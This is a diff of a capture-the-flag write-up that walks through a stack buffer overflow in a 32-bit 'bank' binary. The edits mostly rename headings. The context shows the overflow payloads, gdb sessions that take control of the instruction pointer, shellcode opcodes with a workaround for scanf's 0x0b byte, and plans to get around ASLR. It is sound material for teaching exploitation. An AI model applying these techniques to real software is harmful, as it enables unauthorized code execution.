@@ -14,12 +14,14 @@ Credit: Tux#1576
 
 ## Solution
 
-### Run the Program
+### Step 1: Run the Program
 
 Download the [bank](bank) file and inspect it. The `file` commands shows that the binary is a 32-bit executable and stripped of its debug symbols:
 ```
 $ file bank
-bank: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=26163dec7eb11546fe50a0db8bdae0ea79be8939, stripped
+bank: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter 
+/lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=26163dec7eb11546fe50a0db8bdae0ea79be8939, 
+stripped
 ```
 
 Add execute permissions and run the binary. Play around with the options and get a feel for the program:
@@ -67,9 +69,9 @@ A few quick notes from the initial run:
 
 1. Entering any number besides 1-4 results in an error message: `That is not a valid choice! Try again.`
 2. Entering any non-numeric character results in an infinite loop of the same error message.
-3. The deposit and withdraw options require a **Captcha**, which is always the same: **b3sTbAnK**. Even though the captcha is only eight characters long, the function accepts input of much longer length.
+3. The deposit and withdraw options require a **captcha**, which is always the same: **b3sTbAnK**. Even though the captcha is only eight characters long, the function accepts input of much longer length.
 
-### Decompile with Ghidra
+### Step 2: Decompile with Ghidra
 
 Open the binary in Ghidra and analyze the file. In the **Symbol Tree** under **Functions**, click the `entry` function. This function just calls `__libc_start_main` with `FUN_080493dc` as a parameter.
 ```c
@@ -176,7 +178,7 @@ uint captcha(void)
 
 The full decompiled program can be viewed here: [bank.c](bank.c).
 
-### Segmentation Fault
+### Step 3: Force a Segmentation Fault
 
 What would happen if more than 1000 characters are sent to the `captcha` method? Build a quick payload file with python:
 ```
@@ -200,7 +202,7 @@ Segmentation fault (core dumped)
 
 A captcha input of 1012 characters or more results in a segmentation fault. Anything less does not. This 1012 character limit was determined through trial and error.
 
-### Debug with GDB
+### Step 4: Debug with GDB
 
 Find out what caused the segmentation fault. Open the program in gdb. Run the program with the payload:
 ```
@@ -419,7 +421,7 @@ Breakpoint 2, 0x08049276 in ?? ()
 (gdb) 
 ```
 
-At this point the `ret` function is about to pop the top of the stack (`0x0804928f`) and return to that address. Step again to see this:
+At this point the `ret` function is about to pop the top of the stack (`0x0804928f`) and return to that address. Step again to see this happen:
 ```
 (gdb) si
 => 0x804928f:   test   eax,eax
@@ -456,12 +458,12 @@ Cannot access memory at address 0x41414141
 0x41414141 in ?? ()
 ```
 
-But can the `captcha` function's return instruction be controlled, which is the return at `0x8049277:ret`? Experiment by adding a few more bytes to the payload:
+This `ret` instruction lies in the `withdraw` function at address `0x8049306`. But can the `captcha` function's `ret` instruction at `0x8049277` be controlled? Experiment by adding a few more bytes to the payload:
 ```
 $ python3 -c "print('1 ' + 'A'*1012 + 'BBBB' + 'CCCC')" > payload
 ```
 
-Run the program again with this new payload. Continue until breakpoint at `0x08049276`:
+Run the program again with this new payload. Continue until the breakpoint at `0x08049276`:
 ```
 (gdb) run < payload
 ...
@@ -485,13 +487,13 @@ Breakpoint 2, 0x08049276 in ?? ()
 0x08049277 in ?? ()
 ```
 
-At `0x8049277`, the `ret` instruction is about to pop and return to address `0x43434343`, which is "CCCC" in hex. "CCCC" can be changed to any address desired. Therefore, the payload successfully manipulated the instruction pointer at the `0x8049277:ret` instruction!
+At `0x8049277`, the `ret` instruction is about to pop and return to address `0x43434343`, which is "CCCC" in hex from the payload. Therefore, the payload successfully manipulated the instruction pointer at the `0x8049277:ret` instruction!
 
-### Exploit Version 1: Deploy Payload
+### Step 5: Create Shellcode Payload (Exploit Version 1)
 
 At this point, it's tempting to write shell code to the stack and jump to the shell code address per the instructions in [LiveOverflow's video][4]. Give this approach a try. 
 
-First, find a good address to return to. Open up gdb. Run the program again without a payload (use `set args` to clear any arguments). Run until breakpoint at `0x08049276` then take a look at the stack pointer:
+First, find a good address to return to. Open up gdb. Run the program again without a payload (use `set args` to clear any arguments). Run until the breakpoint at `0x08049276` then take a look at the stack pointer:
 ```
 (gdb) set args
 (gdb) run
@@ -507,11 +509,11 @@ Breakpoint 2, 0x08049276 in ?? ()
 
 The stack pointer `esp` is at `0xffffdd6c`. And the stack looks like this:
 ```
-            return address
-            v
+$esp        return address
+v           v
 0xffffdd6c: 0x0804928f  0xf7fb0000
-^                       ^
-$esp address            payload starts here = $esp + 4
+                        ^
+                        payload starts here = $esp + 4
 ```
 
 The payload starts at `esp` + 4. Use this as the return address for the payload:
@@ -584,13 +586,13 @@ This is good. The program is about to return to `0xffffdd70` (which is `0xffffdd
 
 Examine the stack and make sure everything else is in place. The return address is definitely correct:
 ```
-=> 0x8049277:   ret
-            return address is correct
-            v
+=> 0x8049277:   ret                        
 0xffffdd6c: 0xffffdd70  0x6850c031
+            ^
+            return address is correct
 ```
 
-What about the payload? Compare the intended payload with the stack contents. It is easier to read the stack in byte sizes due to [endianness](https://en.wikipedia.org/wiki/Endianness). Use this command: `x/48bx $esp+4`. Here is the output with comparison to the payload:
+What about the payload? Compare the intended payload with the stack contents. It is easier to read the stack in bytes instead of words due to [endianness](https://en.wikipedia.org/wiki/Endianness). Use this command to display in byte sizes: `x/48bx $esp+4`. Here is the output with comparison to the payload:
 ```
 (gdb) x/48bx $esp+4
 intended payload address
@@ -612,7 +614,7 @@ v
 
 Turns out that `scanf` stops scanning at `0x0b`, which is a vertical tab according to the [ascii table](http://www.asciitable.com/). What happens if this byte is removed? Try it. Remove byte `0x0b`, run the script again, and examine the stack. The stack and payload now match. Thus, only byte `0x0b` causes an issue. Is it possible to get around this? Yes.
 
-### Circumvent Scanf's `0x0b` Limitation
+### Step 6: Circumvent Scanf's `0x0b` Limitation
 
 The `scanf` function stops scanning at byte `0x0b` likely because `0x0b` is considered as a terminating character. Therefore, this byte must be removed from the payload. And the question becomes: how to deliver the same payload without byte `0x0b`?
 
@@ -732,7 +734,7 @@ mov al,0xff     0xb0 0xff
 sub al,0xf4     0x2c 0xf4
 ```
 
-### Exploit Version 2: Execute Shell
+### Step 7: Execute Shell (Exploit Version 2)
 
 Now with the `scanf` byte `0xb` circumvention tactics in hand, create a new [exploit script](exploit2.py) to take advantage of this new information. Remove the `b0 0b` bytes from the original shell code and add in the `mov` and `sub` opcodes:
 ```python
@@ -818,7 +820,7 @@ To turn ASLR back off (default setting), use this:
 (gdb) set disable-randomization on
 ```
 
-### Checksec and Proc Maps
+### Step 8: Inspect Program Security with Checksec and Proc Maps
 
 Before attempting to defeat ASLR, first explore other options. Check the program's security settings with `checksec`:
 ```
@@ -868,7 +870,7 @@ A process's proc map can also be viewed in gdb with this command:
 
 Run the bank program a few more times and print its proc map again. Notice that the `f7d93000` addresses always change due to ASLR. However, addresses from `08048000` to `0804d000` always stay the same. Additionally, section `0804c000-0804d000` has `rwx` permissions (read, write, and execute). This section is particularly vulnerable to exploitation.
 
-### Exploit Version 3: Jump to Scanf
+### Step 9: Jump to Scanf (Exploit Version 3)
 
 The payload cannot reliably jump back to the stack due to ASLR. Therefore, it has to write to and jump back to a reliable location in memory, like section `0804c000-0804d000`. 
 
